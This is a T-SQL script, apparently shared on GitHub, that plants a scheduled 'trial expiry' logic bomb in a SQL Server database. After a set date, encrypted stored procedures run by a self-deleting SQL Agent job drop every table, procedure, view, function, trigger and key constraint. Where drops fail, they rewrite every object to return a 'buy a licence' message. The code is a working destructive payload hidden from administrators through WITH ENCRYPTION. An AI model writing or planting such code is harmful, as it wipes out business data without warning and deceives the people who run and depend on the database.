/*** For More Details ***/
/*** https://github.com/irajuahmed/SQLDbObjectDroppingWithASchedular ***/

/*===========================================================================================================================================================================
		      					                          Configuration Section								
						              You just need to change here, Please dont change anywhere without this block.
=============================================================================================================================================================================*/
USE tempdb
GO
IF OBJECT_ID('##tempTrialTableConfig', 'U') IS NOT NULL 
BEGIN
	DROP TABLE ##tempTrialTableConfig; 
		
END

DECLARE @DatabaseName VARCHAR(200)='ObjectDroppingTestDB'  --Change Here: Change Your Database name.
DECLARE @TrialDays INT = 0 --Change Here: Change your trial days number from @TrialDays variable.
DECLARE @freq_subday_type_Variable INT= 4 --if you want it as minute change it value as 4,If value is 8 then it will be hour, 
DECLARE @freq_subday_interval_Variable INT=1 --Change here as: If your @freq_subday_type=8 then 12 will be hour, @freq_subday_type=4 then 12 will be minutes, 

SELECT  @DatabaseName AS DatabaseName 
	   ,DATEADD(DAY,@TrialDays,GETDATE()) AS ExpairationDate
       ,ISNULL(@freq_subday_type_Variable,4) AS freq_subday_type_Variable
       ,ISNULL(@freq_subday_interval_Variable,15) AS freq_subday_interval_Variable
INTO ##tempTrialTableConfig

USE ObjectDroppingTestDB --Change Here: Change Your Database name.
GO

/*===========================================================================================================================================================================
		      				 
=============================================================================================================================================================================*/

IF OBJECT_ID('uspTrialAlterAllObj', 'P') IS NOT NULL
BEGIN
	DROP PROC uspTrialAlterAllObj	
END

IF OBJECT_ID('uspTrialDemo', 'P') IS NOT NULL
BEGIN
	DROP PROC uspTrialDemo	
END
GO

/*===========================================================================================================================================================================
		      					  Sample Execution Of Alter Object SP.
=============================================================================================================================================================================*/
/*
	EXEC uspTrialAlterAllObj;
*/

/*!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
		      	Here we'll create our first SP to alter View, SP, Trigger, Function and we'll execute it, if we don't have drop permission.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/

CREATE PROC uspTrialAlterAllObj
WITH ENCRYPTION 
AS
BEGIN

	IF(GETDATE()>CAST((SELECT ExpairationDate FROM tempdb..##tempTrialTableConfig) AS datetime))
	BEGIN
		--ALTER DATABASE ObjectDroppingTestDB SET TRUSTWORTHY ON
/*===========================================================================================================================================================================
		      							Alter all SP
=============================================================================================================================================================================*/
		DECLARE @Id INT
		DECLARE @message VARCHAR(500)='Buy a liscence for your aml system.'
		DECLARE @name VARCHAR(500)
		DECLARE @SQL VARCHAR(500)
		DECLARE @constraint VARCHAR(500)

		SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'P' AND category = 0 ORDER BY [id])

		WHILE @Id IS NOT NULL
		BEGIN
			SET @name=(SELECT TOP 1 [name] FROM sysobjects WHERE [type] = 'P' AND category = 0 AND id=@Id ORDER BY [id])
			SELECT @SQL = 'ALTER PROC [dbo].[' + RTRIM(@name) +'] WITH ENCRYPTION AS SELECT '''+@message+''' [Results] '
			EXEC (@SQL)
			PRINT 'Altered SP: ' + @name
			SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'P' AND category = 0 AND [id] > @Id ORDER BY [id])
		END
		
/*===========================================================================================================================================================================
		      					Alter all views
=============================================================================================================================================================================*/

		SET @Id=0
		SET @name=''
		SET @SQL=''
		SET @constraint=''

		SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'V' AND category = 0 ORDER BY [id])

		WHILE @Id IS NOT NULL
		BEGIN
			SET @name=(SELECT TOP 1 [name] FROM sysobjects WHERE [type] = 'V' AND category = 0 AND id=@Id ORDER BY [id])
			SELECT @SQL = 'ALTER VIEW [dbo].[' + RTRIM(@name) +'] WITH ENCRYPTION AS SELECT '''+@message+''' [Results] '
			EXEC (@SQL)
			PRINT 'Altered View: ' + @name
			SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'V' AND category = 0 AND [id] > @Id ORDER BY [id])
		END
		
/*===========================================================================================================================================================================
		      							Alter all functions
=============================================================================================================================================================================*/
		SET @Id=0
		SET @name=''
		SET @SQL=''
		SET @constraint=''

		SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] IN (N'FN', N'IF') AND category = 0 ORDER BY [id])
		WHILE @Id IS NOT NULL
		BEGIN
			SET @name=(SELECT TOP 1 [name] FROM sysobjects WHERE [type] IN (N'FN', N'IF') AND category = 0 AND id=@Id ORDER BY [id])
			DECLARE @type char(50)			
			SET @type=(SELECT TOP 1 [type] FROM sysobjects WHERE [type] IN (N'FN', N'IF') AND category = 0 AND id=@Id ORDER BY [id])
			IF(@type=N'FN')
			BEGIN
				SELECT @SQL = 'ALTER FUNCTION [dbo].[' + RTRIM(@name) +']() RETURNS VARCHAR WITH ENCRYPTION AS BEGIN RETURN  '''+@message+''' END'
			END
			ELSE
			BEGIN
				SELECT @SQL = 'ALTER FUNCTION [dbo].[' + RTRIM(@name) +']() RETURNS TABLE WITH ENCRYPTION AS  RETURN ( SELECT '''+@message+''' [Results] ) '
			END
			EXEC (@SQL)
			PRINT 'Altered Function: ' + @name
			SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] IN (N'FN', N'IF') AND category = 0 AND [id] > @Id ORDER BY [id])
		END
		
/*===========================================================================================================================================================================
		      						  Alter all triggers
=============================================================================================================================================================================*/
		SET @Id=0
		SET @name=''
		SET @SQL=''
		SET @constraint=''

		SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'TR' AND category = 0 ORDER BY [id])

		WHILE @Id IS NOT NULL
		BEGIN
		DECLARE @tableName VARCHAR(500)
			SET @tableName=(SELECT TOP 1 P.name TABLENAME FROM sysobjects C INNER JOIN sysobjects P ON C.parent_obj=P.id WHERE C.[type] = 'TR' AND C.category = 0 AND C.id=@Id  ORDER BY C.[id])
			SET @name=(SELECT TOP 1 [name] FROM sysobjects WHERE [type] = 'TR' AND category = 0 AND id=@Id ORDER BY [id])
			SELECT @SQL = 'ALTER TRIGGER [dbo].[' + RTRIM(@name) +'] ON [dbo].[' + LTRIM(RTRIM(@tableName)) +'] AFTER INSERT, UPDATE, DELETE AS  BEGIN  SELECT '''+@message+'''  END'
			EXEC (@SQL)
			PRINT 'Altered Trigger: ' + @name
			SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'TR' AND category = 0 AND [id] > @Id ORDER BY [id])
		END
/*===========================================================================================================================================================================
		      			Delete your "TrialJob" Shcedular, If exists beacuse there is no further job for this schedular
=============================================================================================================================================================================*/

		DECLARE @jobId binary(16)

		SELECT @jobId = job_id FROM msdb.dbo.sysjobs WHERE (name = N'TrialJob')
		IF (@jobId IS NOT NULL)
		BEGIN
			EXEC msdb.dbo.sp_delete_job @jobId
		END	
END	
	--ALTER DATABASE ObjectDroppingTestDB SET TRUSTWORTHY OFF
END

/*_______________________________________________________________________________________________________________________________________________________________________
		      					  End of Alter Object SP.
_______________________________________________________________________________________________________________________________________________________________________*/


/* !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
               				  Here we'll create our main sp to dynamically drop our all sql object
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! */


IF OBJECT_ID('uspTrialDemo', 'P') IS NOT NULL
DROP PROC uspTrialDemo
GO



CREATE PROC uspTrialDemo
WITH ENCRYPTION 
AS
BEGIN
BEGIN TRY
		IF(GETDATE()>CAST((SELECT ExpairationDate FROM tempdb..##tempTrialTableConfig) AS datetime))
		BEGIN
		  DECLARE @DbValue VARCHAR(500)=(SELECT DatabaseName FROM tempdb..##tempTrialTableConfig)
		  EXEC	('ALTER DATABASE '+@DbValue+' SET TRUSTWORTHY ON			')
		  
/*===========================================================================================================================================================================
		      					       Drop All SP
=============================================================================================================================================================================*/
			DECLARE @Id INT
			DECLARE @name VARCHAR(500)
			DECLARE @SQL VARCHAR(500)
			DECLARE @constraint VARCHAR(500)
			SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'P' AND category = 0 ORDER BY [id])

			WHILE @Id IS NOT NULL
			BEGIN
				SET @name=(SELECT TOP 1 [name] FROM sysobjects WHERE [type] = 'P' AND category = 0 AND id=@Id ORDER BY [id])
				SELECT @SQL = 'DROP PROC [dbo].[' + RTRIM(@name) +']'
				EXEC (@SQL)
				PRINT 'Dropped SP: ' + @name
				SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'P' AND category = 0 AND [id] > @Id ORDER BY [id])
			END

/*===========================================================================================================================================================================
		      					       Drop all views
=============================================================================================================================================================================*/
			SET @Id=0
			SET @name=''
			SET @SQL=''
			SET @constraint=''

			SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'V' AND category = 0 ORDER BY [id])

			WHILE @Id IS NOT NULL
			BEGIN
				SET @name=(SELECT TOP 1 [name] FROM sysobjects WHERE [type] = 'V' AND category = 0 AND id=@Id ORDER BY [id])
				SELECT @SQL = 'DROP VIEW [dbo].[' + RTRIM(@name) +']'
				EXEC (@SQL)
				PRINT 'Dropped View: ' + @name
				SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'V' AND category = 0 AND [id] > @Id ORDER BY [id])
			END

/*===========================================================================================================================================================================
		      					       Drop All Functions
=============================================================================================================================================================================*/
			SET @Id=0
			SET @name=''
			SET @SQL=''
			SET @constraint=''

			SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] IN (N'FN', N'IF', N'TF', N'FS', N'FT') AND category = 0 ORDER BY [id])
			WHILE @Id IS NOT NULL
			BEGIN
				SET @name=(SELECT TOP 1 [name] FROM sysobjects WHERE [type] IN (N'FN', N'IF', N'TF', N'FS', N'FT') AND category = 0 AND id=@Id ORDER BY [id])
				SELECT @SQL = 'DROP FUNCTION [dbo].[' + RTRIM(@name) +']'
				EXEC (@SQL)
				PRINT 'Dropped Function: ' + @name
				SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] IN (N'FN', N'IF', N'TF', N'FS', N'FT') AND category = 0 AND [id] > @Id ORDER BY [id])
			END

/*===========================================================================================================================================================================
		      					    Drop All Foreign Key Constraints
=============================================================================================================================================================================*/
			SET @Id=0
			SET @name=''
			SET @SQL=''
			SET @constraint=''

			SELECT @name = (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS WHERE constraint_catalog=DB_NAME() AND CONSTRAINT_TYPE = 'FOREIGN KEY' ORDER BY TABLE_NAME)

			WHILE @name is not null
			BEGIN
				SELECT @constraint = (SELECT TOP 1 CONSTRAINT_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS WHERE constraint_catalog=DB_NAME() AND CONSTRAINT_TYPE = 'FOREIGN KEY' AND TABLE_NAME = @name ORDER BY CONSTRAINT_NAME)
				WHILE @constraint IS NOT NULL
				BEGIN
					SELECT @SQL = 'ALTER TABLE [dbo].[' + RTRIM(@name) +'] DROP CONSTRAINT [' + RTRIM(@constraint) +']'
					EXEC (@SQL)
					PRINT 'Dropped FK Constraint: ' + @constraint + ' on ' + @name
					SELECT @constraint = (SELECT TOP 1 CONSTRAINT_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS WHERE constraint_catalog=DB_NAME() AND CONSTRAINT_TYPE = 'FOREIGN KEY' AND CONSTRAINT_NAME <> @constraint AND TABLE_NAME = @name ORDER BY CONSTRAINT_NAME)
				END
			SELECT @name = (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS WHERE constraint_catalog=DB_NAME() AND CONSTRAINT_TYPE = 'FOREIGN KEY' ORDER BY TABLE_NAME)
			END

/*===========================================================================================================================================================================
		      					    Drop All Primary Key Constraints
=============================================================================================================================================================================*/
			SET @Id=0
			SET @name=''
			SET @SQL=''
			SET @constraint=''

			SELECT @name = (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS WHERE constraint_catalog=DB_NAME() AND CONSTRAINT_TYPE = 'PRIMARY KEY' ORDER BY TABLE_NAME)

			WHILE @name IS NOT NULL
			BEGIN
				SELECT @constraint = (SELECT TOP 1 CONSTRAINT_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS WHERE constraint_catalog=DB_NAME() AND CONSTRAINT_TYPE = 'PRIMARY KEY' AND TABLE_NAME = @name ORDER BY CONSTRAINT_NAME)
				WHILE @constraint is not null
				BEGIN
					SELECT @SQL = 'ALTER TABLE [dbo].[' + RTRIM(@name) +'] DROP CONSTRAINT [' + RTRIM(@constraint)+']'
					EXEC (@SQL)
					PRINT 'Dropped PK Constraint: ' + @constraint + ' on ' + @name
					SELECT @constraint = (SELECT TOP 1 CONSTRAINT_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS WHERE constraint_catalog=DB_NAME() AND CONSTRAINT_TYPE = 'PRIMARY KEY' AND CONSTRAINT_NAME <> @constraint AND TABLE_NAME = @name ORDER BY CONSTRAINT_NAME)
				END
			SELECT @name = (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS WHERE constraint_catalog=DB_NAME() AND CONSTRAINT_TYPE = 'PRIMARY KEY' ORDER BY TABLE_NAME)
			END

/*===========================================================================================================================================================================
		      					    Drop All Triggers
=============================================================================================================================================================================*/
			SET @Id=0
			SET @name=''
			SET @SQL=''
			SET @constraint=''

			SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'TR' AND category = 0 ORDER BY [id])

			WHILE @Id IS NOT NULL
			BEGIN
				SET @name=(SELECT TOP 1 [name] FROM sysobjects WHERE [type] = 'TR' AND category = 0 AND id=@Id ORDER BY [id])
				SELECT @SQL = 'DROP TRIGGER [dbo].[' + RTRIM(@name) +']'
				EXEC (@SQL)
				PRINT 'Dropped Trigger: ' + @name
				SELECT @Id = (SELECT TOP 1 [id] FROM sysobjects WHERE [type] = 'TR' AND category = 0 AND [id] > @Id ORDER BY [id])
			END

/*===========================================================================================================================================================================
		      					    Drop All Tables
=============================================================================================================================================================================*/
			SET @Id=0
			SET @name=''
			SET @SQL=''
			SET @constraint=''

			SELECT @name = (SELECT TOP 1 [name] FROM sysobjects WHERE [type] = 'U' AND category = 0 ORDER BY [name])

			WHILE @name IS NOT NULL
			BEGIN
				SELECT @SQL = 'DROP TABLE [dbo].[' + RTRIM(@name) +']'
				EXEC (@SQL)
				PRINT 'Dropped Table: ' + @name
				SELECT @name = (SELECT TOP 1 [name] FROM sysobjects WHERE [type] = 'U' AND category = 0 AND [name] > @name ORDER BY [name])
			END
			
/*===========================================================================================================================================================================
		      			Delete your "TrialJob" Shcedular, If exists beacuse there is no further job for this schedular
=============================================================================================================================================================================*/

			DECLARE @jobId binary(16)

			SELECT @jobId = job_id FROM msdb.dbo.sysjobs WHERE (name = N'TrialJob')
			IF (@jobId IS NOT NULL)
			BEGIN
				EXEC msdb.dbo.sp_delete_job @jobId
			END
		END

END TRY
BEGIN CATCH 

/*===========================================================================================================================================================================
		      		if any error occured in our "uspTrialDemo" SP/ or user don't have drop permission then error will occured 
				then our CATCH block will execute & here we'll call our alter object SP.
=============================================================================================================================================================================*/
	EXEC uspTrialAlterAllObj;
	
END CATCH	
END
GO



/* !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
               				Here we'll create a SQL Job Schedular,Which name will be "TrialJob" & It'll called every day after 12 hours.
					i.e: you can change it's calling fequency by following my guide line.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! */


USE [msdb]
GO

DECLARE @jobId2 BINARY(16)
SELECT @jobId2 = job_id FROM msdb.dbo.sysjobs WHERE (name = N'TrialJob')
IF (@jobId2 IS NOT NULL)
BEGIN
	EXEC msdb.dbo.sp_delete_job @jobId2
END

BEGIN TRANSACTION

DECLARE @DateInIntData INT
DECLARE @jobId BINARY(16)
DECLARE @ReturnCode INT
DECLARE @User NVARCHAR(500)=(SELECT SUSER_NAME())

/*===========================================================================================================================================================================
        Value of @DateInIntData will be like this =20210224, where 2021=year,02=month & 24=day & it'll dynamically add current date as your schedular start date.
=============================================================================================================================================================================*/

SELECT @ReturnCode = 0 
SET @DateInIntData=CAST(
					(CAST((SELECT DATEPART(YEAR,GETDATE())) AS VARCHAR(4))
				   +RIGHT('00'+CAST((SELECT DATEPART(MONTH,GETDATE())) AS VARCHAR(4)),2)
				   +RIGHT('00'+CAST((SELECT DATEPART(DAY,GETDATE())) AS VARCHAR(4)),2))
				   AS INT)

IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
	EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
	IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
END

EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'TrialJob', 
		@enabled=1, 
		@notify_level_eventlog=0, 
		@notify_level_email=0, 
		@notify_level_netsend=0, 
		@notify_level_page=0, 
		@delete_level=0, 
		@description=N'No description available.', 
		@category_name=N'[Uncategorized (Local)]', 
		@owner_login_name=@User, @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

DECLARE @databaseValue VARCHAR(400)=(SELECT DatabaseName FROM tempdb..##tempTrialTableConfig)
DECLARE @commandValue NVARCHAR(500)=N'USE '+@databaseValue+' 
GO
EXEC uspTrialDemo;

'
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'Execution', 
		@step_id=1, 
		@cmdexec_success_code=0, 
		@on_success_action=1, 
		@on_success_step_id=0, 
		@on_fail_action=2, 
		@on_fail_step_id=0, 
		@retry_attempts=0, 
		@retry_interval=0, 
		@os_run_priority=0, @subsystem=N'TSQL', 
		@command=@commandValue, 
		@database_name=N'master', 
		@flags=0
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
DECLARE @schedule_uid2 NVARCHAR(500)=(SELECT NEWID())

DECLARE @freq_subday_type_Value INT=(SELECT ISNULL(freq_subday_type_Variable,4) FROM tempdb..##tempTrialTableConfig)
DECLARE @freq_subday_interval_Value INT=(SELECT ISNULL(freq_subday_interval_Variable,4) FROM tempdb..##tempTrialTableConfig)
EXEC @ReturnCode = msdb.dbo.sp_add_jobschedule @job_id=@jobId, @name=N'TrialJobSchedule', 
		@enabled=1, 
		@freq_type=4, 
		@freq_interval=1, 
		@freq_subday_type=@freq_subday_type_Value,
		@freq_subday_interval=@freq_subday_interval_Value,
		@freq_relative_interval=0, 
		@freq_recurrence_factor=0, 
		@active_start_date=@DateInIntData, 
		@active_end_date=99991231, 
		@active_start_time=0, 
		@active_end_time=235959, 
		@schedule_uid=@schedule_uid2
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:
GO
